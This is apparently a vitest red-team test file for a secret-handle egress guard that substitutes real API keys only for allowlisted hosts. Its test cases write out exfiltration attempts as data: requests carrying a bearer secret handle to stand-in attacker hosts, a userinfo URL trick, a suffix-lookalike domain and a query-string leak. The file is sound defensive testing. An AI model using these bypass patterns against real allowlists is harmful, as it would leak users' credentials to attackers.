import { describe, expect, it } from "vitest";
import { substituteSecretHandles } from "../index.js";

// Red-team suite for the secret-handle egress boundary (06-apps §4.3).
// substituteSecretHandles is the LAST line of defense: it swaps an opaque handle
// for a real secret ONLY when the request is bound for an allowlisted host. The
// adversary's goal is to make the real secret egress to a host they control. Every
// case below is an exfil attempt that must FAIL closed (handle stays, value never leaks).
//
// NOTE: see wired-in.test.ts — in the OSS e2b/modal path this helper is not even
// invoked; the real secret value never enters the sandbox at all.

const HANDLE = "vendo-secret:STRIPE_KEY:nonce";
const REAL = "sk_live_REALSECRET";
const handleMap = { [HANDLE]: REAL };

/** Assert the real secret appears nowhere in the returned request. */
const assertNoLeak = (request: { headers?: Record<string, string>; body?: string | Uint8Array }): void => {
  const serialized = JSON.stringify({
    headers: request.headers,
    body: typeof request.body === "string" ? request.body : "[binary]",
  });
  expect(serialized).not.toContain(REAL);
  expect(serialized).toContain(HANDLE);
};

describe("secret-handle exfiltration", () => {
  it("substitutes toward an exact allowlisted host", () => {
    const out = substituteSecretHandles({
      url: "https://api.stripe.com/x",
      headers: { authorization: `Bearer ${HANDLE}` },
      body: `key=${HANDLE}`,
    }, handleMap, ["api.stripe.com"]);
    expect(out.headers?.authorization).toBe(`Bearer ${REAL}`);
    expect(out.body).toBe(`key=${REAL}`);
  });

  it("leaves the handle intact toward a NON-allowlisted host (real value never egresses)", () => {
    const out = substituteSecretHandles({
      url: "https://evil.attacker.test/collect",
      headers: { authorization: `Bearer ${HANDLE}` },
      body: `key=${HANDLE}`,
    }, handleMap, ["api.stripe.com"]);
    assertNoLeak(out);
  });

  it("wildcard *.example.com matches a subdomain but NOT the apex or a suffix lookalike", () => {
    const attempt = (host: string): string | Uint8Array | undefined => substituteSecretHandles(
      { url: `https://${host}/`, body: HANDLE },
      handleMap,
      ["*.example.com"],
    ).body;
    expect(attempt("files.example.com")).toBe(REAL); // legit subdomain
    expect(attempt("example.com")).toBe(HANDLE); // apex is NOT covered by *.
    expect(attempt("notexample.com")).toBe(HANDLE); // suffix lookalike must not match
  });

  it("blocks the userinfo trick: https://api.stripe.com@evil.com resolves to evil.com", () => {
    const out = substituteSecretHandles({
      url: "https://api.stripe.com@evil.com/",
      headers: { authorization: `Bearer ${HANDLE}` },
      body: HANDLE,
    }, handleMap, ["api.stripe.com"]);
    // hostname is evil.com; the "api.stripe.com" is just userinfo → no substitution.
    assertNoLeak(out);
  });

  it("does NOT rewrite a handle hidden in the QUERY STRING (only headers/string body are rewritten)", () => {
    const out = substituteSecretHandles({
      url: `https://api.stripe.com/x?leak=${HANDLE}`,
      headers: {},
    }, handleMap, ["api.stripe.com"]);
    // The URL is never rewritten, so a query-string handle never becomes the real value.
    expect(out.url).toContain(HANDLE);
    expect(out.url).not.toContain(REAL);
  });

  it("does NOT substitute into a binary (Uint8Array) body (fail-safe)", () => {
    const bytes = new TextEncoder().encode(HANDLE);
    const out = substituteSecretHandles({
      url: "https://api.stripe.com/x",
      body: bytes,
    }, handleMap, ["api.stripe.com"]);
    expect(out.body).toBe(bytes); // untouched; no decode-and-inject
    expect(new TextDecoder().decode(out.body as Uint8Array)).not.toContain(REAL);
  });

  it("does not treat evil-allowed.com as a match for allowlist entry allowed.com", () => {
    const out = substituteSecretHandles({
      url: "https://evil-allowed.com/x",
      headers: { authorization: `Bearer ${HANDLE}` },
      body: HANDLE,
    }, handleMap, ["allowed.com"]);
    assertNoLeak(out);
  });

  it("returns the request verbatim when the URL cannot be parsed (fail-safe)", () => {
    const out = substituteSecretHandles({
      url: "::::not a url::::",
      headers: { authorization: `Bearer ${HANDLE}` },
      body: HANDLE,
    }, handleMap, ["api.stripe.com"]);
    assertNoLeak(out);
  });
});
